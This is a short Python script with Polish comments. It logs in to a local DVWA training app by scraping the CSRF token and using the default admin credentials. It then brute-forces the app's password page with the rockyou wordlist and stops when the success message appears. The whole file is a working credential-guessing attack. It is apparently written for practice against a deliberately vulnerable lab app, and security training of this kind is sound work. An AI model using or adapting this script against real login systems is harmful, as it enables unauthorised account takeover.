import requests
from bs4 import BeautifulSoup

session = requests.Session() #tworzymy sesje http


#zdobycie tokena
login_page = session.get('http://localhost/login.php') #pobieramy strone logowania
soup = BeautifulSoup(login_page.text, 'html.parser') #analizujemy ja
token = soup.find('input', {'name': 'user_token'})['value'] #wyszukujemy tam user_token i zapisujemy jego wartosc


#deklaracja danych logowania do DVWA i tokenu
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login', #nazwa przycisku do logowania
    'user_token': token
}

session.post('http://localhost/login.php', data=login_data) #wysylamy dane logowania na strone





#strona do testowania
url = 'http://localhost/vulnerabilities/brute/'

#deklarowanie loginu i hasel
username = 'admin'
with open('rockyou2.txt', 'r', encoding='utf-8') as f:
    passwords = [line.strip() for line in f]


#dla kazdego hasla
for password in passwords:
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }

    response = session.get(url, params=params) #wysylamy zapytanie z prametrami


    # Jeśli komunikaty w odpowiedzi sie zgadzaja to jes haslem
    if f"Welcome to the password protected area {username}" in response.text and "Username and/or password incorrect." not in response.text:
        print(f"[+] Hasło znalezione: {password}")
        break


        
   

